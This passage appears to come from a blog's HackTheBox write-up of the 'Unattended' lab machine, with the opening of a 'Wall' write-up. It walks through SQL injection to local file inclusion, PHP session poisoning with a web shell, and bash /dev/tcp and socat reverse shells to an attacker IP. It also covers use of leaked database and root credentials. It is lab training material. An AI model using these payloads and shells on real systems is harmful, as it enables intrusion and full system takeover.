(Status: 200) [Size: 1244] /dev (Status: 301) [Size: 1] Foothold We have 3 pages on https://www.nestedflanders.htb/index.php Click main and you will see ?id=25 Other pages show identical parameter but with other value If we visit about page, but also add ', like https://www.nestedflanders.htb/index.php?id=465', we are redirected to main page Let\u0026rsquo;s launch sqlmap └─$ sqlmap -u \u0026#39;https://www.nestedflanders.htb/index.php?id=465\u0026#39; --batch \u0026lt;SNIP\u0026gt; GET parameter \u0026#39;id\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=465\u0026#39; AND 1933=1933 AND \u0026#39;petC\u0026#39;=\u0026#39;petC Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=465\u0026#39; AND (SELECT 5116 FROM (SELECT(SLEEP(5)))hwSG) AND \u0026#39;EjoV\u0026#39;=\u0026#39;EjoV --- [16:31:09] [INFO] the back-end DBMS is MySQL web application technology: PHP, Nginx 1.10.3 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [16:31:09] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/www.nestedflanders.htb\u0026#39; [*] ending @ 16:31:09 /2023-10-28/ I\u0026rsquo;ll dump the databases and the tables └─$ sqlmap -u \u0026#39;https://www.nestedflanders.htb/index.php?id=465\u0026#39; --batch --dbs \u0026lt;SNIP\u0026gt; available databases [2]: [*] information_schema [*] neddy └─$ sqlmap -u \u0026#39;https://www.nestedflanders.htb/index.php?id=465\u0026#39; --batch -D neddy --tables \u0026lt;SNIP\u0026gt; Database: neddy [11 tables] +--------------+ | config | | customers | | employees | | filepath | | idname | | offices | | orderdetails | | orders | | payments | | productlines | | products | +--------------+ I\u0026rsquo;ll dump everyting in the background If we visit dev it says dev site has been moved to his own server Could be dev.nestedflanders.htb I tried fuzzing subdomains but no luck Based on forum hints, I got on the right track So there seems like another way to path traverse if nginx is used as proxy https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/ https://www.youtube.com/watch?v=CIhHpkybYsY\u0026t=572s If location doesn\u0026rsquo;t end with /, we can esca[e the path location /i { # Have to be /i/ alias /data/w3/images/; } We can test for misconfiguration If we consider basic path: /var/www/, we gave html and probably dev folders We can\u0026rsquo;t traverse to html, since we are in dev But if we perform path traversing mentioned above, we have a hit └─$ curl -s -k -i https://www.nestedflanders.htb/dev/../html/index.html | grep HTTP HTTP/1.1 404 Not Found └─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/index.html | grep HTTP HTTP/1.1 200 OK If you can read this page, it means that the Apache HTTP server installed at \u0026lt;tt\u0026gt;/var/www/html/index.html\u0026lt;/tt\u0026gt;) before continuing to operate your HTTP server. We can dump the index.php which was used in root path └─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/index.php HTTP/1.1 200 OK Server: nginx/1.10.3 Date: Sat, 28 Oct 2023 16:33:51 GMT Content-Type: application/octet-stream Content-Length: 2721 Last-Modified: Wed, 19 Dec 2018 15:37:40 GMT Connection: keep-alive ETag: \u0026#34;5c1a65c4-aa1\u0026#34; Accept-Ranges: bytes \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;nestedflanders\u0026#34;; $password = \u0026#34;1036913cf7d38d4ea4f79b050f171e9fbf3f5e\u0026#34;; $db = \u0026#34;neddy\u0026#34;; $conn = new mysqli($servername, $username, $password, $db); $debug = False; include \u0026#34;6fb17817efb4131ae4ae1acae0f7fd48.php\u0026#34;; function getTplFromID($conn) { global $debug; $valid_ids = array (25,465,587); if ( (array_key_exists(\u0026#39;id\u0026#39;, $_GET)) \u0026amp;\u0026amp; (intval($_GET[\u0026#39;id\u0026#39;]) == $_GET[\u0026#39;id\u0026#39;]) \u0026amp;\u0026amp; (in_array(intval($_GET[\u0026#39;id\u0026#39;]),$valid_ids)) ) { $sql = \u0026#34;SELECT name FROM idname where id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;\u0026#34;; } else { $sql = \u0026#34;SELECT name FROM idname where id = \u0026#39;25\u0026#39;\u0026#34;; } if ($debug) { echo \u0026#34;sqltpl: $sql\u0026lt;br\u0026gt;\\n\u0026#34;; } $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { $ret = $row[\u0026#39;name\u0026#39;]; } } else { $ret = \u0026#39;main\u0026#39;; } if ($debug) { echo \u0026#34;rettpl: $ret\u0026lt;br\u0026gt;\\n\u0026#34;; } return $ret; } function getPathFromTpl($conn,$tpl) { global $debug; $sql = \u0026#34;SELECT path from filepath where name = \u0026#39;\u0026#34;.$tpl.\u0026#34;\u0026#39;\u0026#34;; if ($debug) { echo \u0026#34;sqlpath: $sql\u0026lt;br\u0026gt;\\n\u0026#34;; } $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { $ret = $row[\u0026#39;path\u0026#39;]; } } if ($debug) { echo \u0026#34;retpath: $ret\u0026lt;br\u0026gt;\\n\u0026#34;; } return $ret; } $tpl = getTplFromID($conn); $inc = getPathFromTpl($conn,$tpl); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Ne(ste)d Flanders\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Ne(ste)d Flanders\u0026#39; Portfolio\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div center class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;?php $sql = \u0026#34;SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = \u0026#39;0\u0026#39; order by i.id\u0026#34;; if ($debug) { echo \u0026#34;sql: $sql\u0026lt;br\u0026gt;\\n\u0026#34;; } $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { //if ($debug) { echo \u0026#34;rowid: \u0026#34;.$row[\u0026#39;id\u0026#39;].\u0026#34;\u0026lt;br\u0026gt;\\n\u0026#34;; } // breaks layout echo \u0026#39;\u0026lt;div class=\u0026#34;col-md-2\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index.php?id=\u0026#39;.$row[\u0026#39;id\u0026#39;].\u0026#39;\u0026#34; target=\u0026#34;maifreim\u0026#34;\u0026gt;\u0026#39;.$row[\u0026#39;name\u0026#39;].\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;; } } else { ?\u0026gt; \u0026lt;div class=\u0026#34;col-md-2\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index.php?id=25\u0026#34;\u0026gt;main\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-2\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index.php?id=465\u0026#34;\u0026gt;about\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-2\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index.php?id=587\u0026#34;\u0026gt;contact\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- container --\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt; --\u0026gt; \u0026lt;?php include(\u0026#34;$inc\u0026#34;); ?\u0026gt; \u0026lt;!-- \u0026lt;/div\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- container --\u0026gt; \u0026lt;?php if ($debug) { echo \u0026#34;include $inc;\u0026lt;br\u0026gt;\\n\u0026#34;; } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php $conn-\u0026gt;close(); ?\u0026gt; We have a LFI \u0026lt;SNIP\u0026gt; $conn = new mysqli($servername, $username, $password, $db); $debug = False; include \u0026#34;6fb17817efb4131ae4ae1acae0f7fd48.php\u0026#34;; function getTplFromID($conn) { global $debug; $valid_ids = array (25,465,587); if ( (array_key_exists(\u0026#39;id\u0026#39;, $_GET)) \u0026amp;\u0026amp; (intval($_GET[\u0026#39;id\u0026#39;]) == $_GET[\u0026#39;id\u0026#39;]) \u0026amp;\u0026amp; (in_array(intval($_GET[\u0026#39;id\u0026#39;]),$valid_ids)) ) { $sql = \u0026#34;SELECT name FROM idname where id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;\u0026#34;; } else { $sql = \u0026#34;SELECT name FROM idname where id = \u0026#39;25\u0026#39;\u0026#34;; } if ($debug) { echo \u0026#34;sqltpl: $sql\u0026lt;br\u0026gt;\\n\u0026#34;; } $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { $ret = $row[\u0026#39;name\u0026#39;]; } } else { $ret = \u0026#39;main\u0026#39;; } if ($debug) { echo \u0026#34;rettpl: $ret\u0026lt;br\u0026gt;\\n\u0026#34;; } return $ret; } function getPathFromTpl($conn,$tpl) { global $debug; $sql = \u0026#34;SELECT path from filepath where name = \u0026#39;\u0026#34;.$tpl.\u0026#34;\u0026#39;\u0026#34;; if ($debug) { echo \u0026#34;sqlpath: $sql\u0026lt;br\u0026gt;\\n\u0026#34;; } $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { $ret = $row[\u0026#39;path\u0026#39;]; } } if ($debug) { echo \u0026#34;retpath: $ret\u0026lt;br\u0026gt;\\n\u0026#34;; } return $ret; } $tpl = getTplFromID($conn); $inc = getPathFromTpl($conn,$tpl); \u0026lt;SNIP\u0026gt; \u0026lt;?php include(\u0026#34;$inc\u0026#34;); ?\u0026gt; \u0026lt;!-- \u0026lt;/div\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- container --\u0026gt; \u0026lt;?php if ($debug) { echo \u0026#34;include $inc;\u0026lt;br\u0026gt;\\n\u0026#34;; } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php \u0026lt;SNIP\u0026gt; Let\u0026rsquo;s check another file included └─$ curl -s -k -i https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php HTTP/1.1 200 OK Server: nginx/1.10.3 Date: Sat, 28 Oct 2023 16:38:29 GMT Content-Type: application/octet-stream Content-Length: 256 Last-Modified: Wed, 19 Dec 2018 13:32:41 GMT Connection: keep-alive ETag: \u0026#34;5c1a4879-100\u0026#34; Accept-Ranges: bytes \u0026lt;?php session_start(); if (isset($_SESSION[\u0026#39;user_name\u0026#39;])){ $user_name = $_SESSION[\u0026#39;user_name\u0026#39;]; } foreach ($_COOKIE as $key =\u0026gt; $val) { $_SESSION[$key] = $val; } /* removed everything because of undergoing investigation, please check dev and staging */ We control the id value But we have to bypass several checks from (array_key_exists('id', $_GET)) \u0026amp;\u0026amp; (intval($_GET['id']) == $_GET['id']) \u0026amp;\u0026amp; (in_array(intval($_GET['id']),$valid_ids)) array_key_exists('id', $_GET) - The parameter needs to be present in_array(intval($_GET['id']),$valid_ids) - The number should be from valid_ids intval($_GET['id']) == $_GET['id'] - It uses == operator, which is different from === Another thing is that intval processes the string which starts with int, while it drops the rest of it php \u0026gt; echo intval(\u0026#34;13\u0026#34;); 13 php \u0026gt; echo intval(\u0026#34;13 TEST\u0026#34;); 13 php \u0026gt; Okay, since we got familiar with checks, we have to inject our payload to: SELECT name FROM idname where id = '\u0026quot;.$_GET['id'].\u0026quot;' SELECT path from filepath where name = '\u0026quot;.$tpl.\u0026quot;' SELECT name FROM idname where id = '\u0026quot;.$_GET['id'].\u0026quot;' returns the page if it exists in the table or it will return us the main page We have to control the output of the query So we can make it return False then UNION query anything we want The statement will be executed since it\u0026rsquo;s a valid one and passes the check $result-\u0026gt;num_rows \u0026gt; 0 The payload will be in the form of: \u0026lt;VALID_ID\u0026gt;' AND 1=2 UNION SELECT \u0026quot;\u0026lt;ANYTHING\u0026gt;\u0026quot;-- - We can test it with https://www.nestedflanders.htb/index.php?id=id=465' and 1=2 union select \u0026quot;about\u0026quot;-- - It should return about page Now, we have to inject to second query SELECT path from filepath where name = '\u0026quot;.$tpl.\u0026quot;' The payload will had \u0026lt;VALID_ID\u0026gt;' AND 1=2 UNION SELECT \u0026quot;\u0026lt;ANYTHING\u0026gt;\u0026quot; Now we place the second payload instead of ANYTHING Don\u0026rsquo;t forget to escape the quotes Now, we have: \u0026lt;VALID_ID\u0026gt;' AND 1=2 UNION SELECT \u0026quot;TEST\\' UNION SELECT \\\u0026quot;/etc/passwd\\\u0026quot;-- -\u0026quot;-- - For example, https://www.nestedflanders.htb/index.php?id=465' and 1=2 union select \u0026quot;test\\' union select \\\u0026quot;/etc/passwd\\\u0026quot;-- -\u0026quot;-- - To get a shell, we can perform log/session poisoning There are 2 paths: via /var/log/nginx/access.log https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions or via session cookie and /var/lib/php/sessions/ https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions I have already done the attack in other boxes via first method, so I will try to do it using second one https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session First, we need to know our PHPSESSID Then we prepend the prefix, like sess_\u0026lt;PHPSESSID\u0026gt; Now using via LFI we read /var/lib/php/sessions/sess_\u0026lt;PHPSESSID\u0026gt; Now, we can set another cookie Make sure add space before new cookie We now can insert php code, which should be executed SHELL=\u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt; - the code should be url-encoded Great, let\u0026rsquo;s get reverse shell bash -c '/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/443 0\u0026gt;\u0026amp;1' - url-encoded User Looks like hidepid is configured https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/ www-data@unattended:/var/www/html$ ps awuxx USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND www-data 678 0.0 0.3 180664 6864 ? S 09:21 0:00 nginx: worker process www-data 1163 0.0 0.0 4288 740 ? S 09:29 0:00 sh -c bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/443 0\u0026gt;\u0026amp;1\u0026#39; www-data 1164 0.0 0.1 17944 2816 ? S 09:29 0:00 bash -c bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/443 0\u0026gt;\u0026amp;1 www-data 1165 0.0 0.1 18168 3316 ? S 09:29 0:00 bash -i www-data 1187 0.0 0.4 35912 8468 ? S 09:31 0:00 python3 -c import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;) www-data 1188 0.0 0.1 18192 3252 pts/0 Ss 09:31 0:00 /bin/bash www-data 1203 0.0 0.1 36636 2812 pts/0 R+ 09:32 0:00 ps awuxx noexec is configured on tmp and /dev/shm www-data@unattended:/$ mount | grep -e \u0026#34;tmp \u0026#34; -e shm tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec) tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime) Let\u0026rsquo;s check mysql, since there is nothing else to check www-data@unattended:/$ mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 33 Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | neddy | +--------------------+ 2 rows in set (0.00 sec) MariaDB [(none)]\u0026gt; use neddy; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [neddy]\u0026gt; show tables; +-----------------+ | Tables_in_neddy | +-----------------+ | config | | customers | | employees | | filepath | | idname | | offices | | orderdetails | | orders | | payments | | productlines | | products | +-----------------+ 11 rows in set (0.00 sec) MariaDB [neddy]\u0026gt; Let\u0026rsquo;s check config table MariaDB [neddy]\u0026gt; select * from config; +-----+-------------------------+--------------------------------------------------------------------------+ | id | option_name | option_value | +-----+-------------------------+--------------------------------------------------------------------------+ | 54 | offline | 0 | | 55 | offline_message | Site offline, please come back later | | 56 | display_offline_message | 0 | | 57 | offline_image | | | 58 | sitename | NestedFlanders | | 59 | editor | tinymce | | 60 | captcha | 0 | | 61 | list_limit | 20 | | 62 | access | 1 | | 63 | debug | 0 | | 64 | debug_lang | 0 | | 65 | dbtype | mysqli | | 66 | host | localhost | | 67 | live_site | | | 68 | gzip | 0 | | 69 | error_reporting | default | | 70 | ftp_host | 127.0.0.1 | | 71 | ftp_port | 21 | | 72 | ftp_user | flanders | | 73 | ftp_pass | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 | | 74 | ftp_root | / | | 75 | ftp_enable | 1 | | 76 | offset | UTC | | 77 | mailonline | 1 | | 78 | mailer | mail | | 79 | mailfrom | nested@nestedflanders.htb | | 80 | fromname | Neddy | | 81 | sendmail | /usr/sbin/sendmail | | 82 | smtpauth | 0 | | 83 | smtpuser | | | 84 | smtppass | | | 85 | smtppass | | | 86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; | | 87 | smtphost | localhost | | 88 | smtpsecure | none | | 89 | smtpport | 25 | | 90 | caching | 0 | | 91 | cache_handler | file | | 92 | cachetime | 15 | | 93 | MetaDesc | | | 94 | MetaKeys | | | 95 | MetaTitle | 1 | | 96 | MetaAuthor | 1 | | 97 | MetaVersion | 0 | | 98 | robots | | | 99 | sef | 1 | | 100 | sef_rewrite | 0 | | 101 | sef_suffix | 0 | | 102 | unicodeslugs | 0 | | 103 | feed_limit | 10 | | 104 | lifetime | 1 | | 105 | session_handler | file | +-----+-------------------------+--------------------------------------------------------------------------+ We can insert and update entires in neddy database MariaDB [neddy]\u0026gt; SHOW GRANTS; +-----------------------------------------------------------------------------------------------------------------------+ | Grants for nestedflanders@localhost | +-----------------------------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO \u0026#39;nestedflanders\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY PASSWORD \u0026#39;*9E1AD37C883F20EE8B5FB34B4B150262F9671A58\u0026#39; | | GRANT SELECT, INSERT, UPDATE ON `neddy`.* TO \u0026#39;nestedflanders\u0026#39;@\u0026#39;localhost\u0026#39; | +-----------------------------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) The interesting entry is checkrelease which has a value of /home/guly/checkbase.pl;/home/guly/checkplugins.pl; Maybe there is an execution happening, but since we can\u0026rsquo;t run pspy due to hidepid, we can only test it by changing The box has no nc, but has socat installed update config set option_value = \u0026ldquo;socat TCP:10.10.16.4:6666 EXEC:\u0026lsquo;bash -li\u0026rsquo;,pty,stderr,setsid,sigint,sane\u0026rdquo; where id = 86; MariaDB [neddy]\u0026gt; update config set option_value = \u0026#34;socat TCP:10.10.16.4:80 EXEC:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane\u0026#34; where id = 86; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 MariaDB [neddy]\u0026gt; select * from config where id = 86; +----+--------------+-------------------------------------------------------------------------+ | id | option_name | option_value | +----+--------------+-------------------------------------------------------------------------+ | 86 | checkrelease | socat TCP:10.10.16.4:80 EXEC:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane | +----+--------------+-------------------------------------------------------------------------+ 1 row in set (0.00 sec) After few seconds we receive a connection Root User groups show us unusual group grub, which is not listed in https://wiki.debian.org/SystemGroups guly@unattended:~$ id uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev) Let\u0026rsquo;s check the files/directories owned by that group guly@unattended:~$ find / -group grub 2\u0026gt;/dev/null /boot/initrd.img-4.9.0-8-amd64 guly@unattended:~$ file /boot/initrd.img-4.9.0-8-amd64 /boot/initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Wed Sep 28 10:31:45 2022, from Unix It\u0026rsquo;s a initrd initrd provides the capability to load a RAM disk by the boot loader. This RAM disk can then be mounted as the root file system and programs can be run from it. Since it contains initial settings and executables, let\u0026rsquo;s check if there is something interesting Lets uncompress it via zcat /boot/initrd.img | cpio -idmv https://access.redhat.com/solutions/24029 guly@unattended:/dev/shm/archive$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv . boot boot/guid \u0026lt;SNIP\u0026gt; guly@unattended:/dev/shm/archive$ ls bin boot conf etc init lib lib64 run sbin scripts Started with looking at the scripts folder Noticed cryptroot script While scrolling through, we see an interesting comment by guly guly@unattended:/dev/shm/archive/scripts$ ls -lha local-top/ total 20K drwxr-xr-x 2 guly guly 100 Oct 29 10:02 . drwxr-xr-x 8 guly guly 220 Oct 29 10:02 .. -rwxr-xr-x 1 guly guly 721 May 9 2017 cryptopensc -rwxr-xr-x 1 guly guly 9.3K Dec 20 2018 cryptroot -rw-r--r-- 1 guly guly 162 Sep 28 2022 ORDER \u0026lt;SNIP\u0026gt; # guly: we have to deal with lukfs password sync when root changes her one if ! crypttarget=\u0026#34;$crypttarget\u0026#34; cryptsource=\u0026#34;$cryptsource\u0026#34; \\ /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then message \u0026#34;cryptsetup: cryptsetup failed, bad password or options?\u0026#34; sleep 3 continue fi fi \u0026lt;SNIP\u0026gt; We have if block with crypttarget=\u0026quot;$crypttarget\u0026quot; cryptsource=\u0026quot;$cryptsource\u0026quot; /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen We see an execution uinitrd c0m3s3f0ss34nt4n1 passed to $cryptopen, which is a cryptsetup Cryptsetup provides an interface for configuring encryption on block devices (such as /home or swap partitions), using the Linux kernel device mapper target dm-crypt. It features integrated Linux Unified Key Setup (LUKS) support. https://man7.org/linux/man-pages/man8/cryptsetup.8.html So uinitrd probably passes a password to cryptsetup https://superuser.com/questions/1179046/passing-luks-passphrase-to-unlock-encrypted-rootfs-with-script-instead-of-passin \u0026lt;SNIP\u0026gt; # Prepare commands cryptopen=\u0026#34;/sbin/cryptsetup -T 1\u0026#34; if [ \u0026#34;$cryptdiscard\u0026#34; = \u0026#34;yes\u0026#34; ]; then cryptopen=\u0026#34;$cryptopen --allow-discards\u0026#34; fi \u0026lt;SNIP\u0026gt; Let\u0026rsquo;s try running it I forgot we had noexec set, so I had to move the binary guly home directory guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1 bash: ./sbin/uinitrd: Permission denied guly@unattended:/dev/shm/archive$ chmod +x ./sbin/uinitrd guly@unattended:/dev/shm/archive$ ./sbin/uinitrd c0m3s3f0ss34nt4n1 bash: ./sbin/uinitrd: Permission denied uly@unattended:/dev/shm/archive$ cp ./sbin/uinitrd ~/ guly@unattended:/dev/shm/archive$ chmod +x ~/uinitrd guly@unattended:/dev/shm/archive$ ~/uinitrd c0m3s3f0ss34nt4n1 132f93ab100671dcb263acaf5dc95d8260e8b7c6 We can su as root /dev/shm/archive$ su - Password: root@unattended:~# ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/unattended/images/unattended.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/unattended/","summary":"Unattended Enumeration nmap └─$ nmap -Pn -p- 10.10.10.126 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 16:02 BST Nmap scan report for 10.10.10.126 (10.10.10.126) Host is up (0.17s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 38.83 seconds └─$ nmap -Pn -p80,443 -sC -sV 10.10.10.126 --min-rate 5000 Starting Nmap 7.","tags":["HTB","sqli","sqlmap","nginx","nginx-aliases","lfi","session-poisoning","socat","hidepid","noexec","mysql","initrd","cpio"],"title":"[HTB] Machine: Unattended"},{"categories":null,"contents":"Wall Enumeration nmap └─$ nmap -Pn -p- 10.10.10.157 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:21 BST Warning: 10.10.10.157 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.157 (10.10.10.157) Host is up (0.17s latency). Not shown: 46442 filtered tcp ports (no-response), 19091 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.157 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:27 BST Nmap scan report for 10.10.10.157 (10.10.10.157) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA) | 256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA) |_ 256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.157 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.157 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /index.html (Status: 200) [Size: 10918] /.php (Status: 403) [Size: 291] /aa.php (Status: 200) [Size: 1] /monitoring (Status: 401) [Size: 459] /panel.php (Status: 200) [Size: 26] Foothold aa.php and panel.php don\u0026rsquo;t have anything interesting └─$ curl 10.10.10.157/panel.php Just a test for php file ! └─$ curl 10.10.10.157/aa.php 1 We could fuzz parameters and http methods Nothing interesting except 403 for a few params └─$ wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ -u http://10.10.10.157/panel.php /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.157/panel.php Total requests: 5 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 0 L 7 W 26 Ch \u0026#34;GET - GET\u0026#34; 000000003: 200 0 L 7 W 26 Ch \u0026#34;POST - POST\u0026#34; 000000002: 200 0 L 0 W 0 Ch \u0026#34;HEAD - HEAD\u0026#34; 000000004: 405 9 L 35 W 310 Ch \u0026#34;TRACE - TRACE\u0026#34; 000000005: 200 0 L 7 W 26 Ch \u0026#34;OPTIONS - OPTIONS\u0026#34; Total time: 0.380631 Processed Requests: 5 Filtered Requests: 0 Requests/sec.: 13.13606 └─$ wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ -u http://10.10.10.157/aa.php /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing 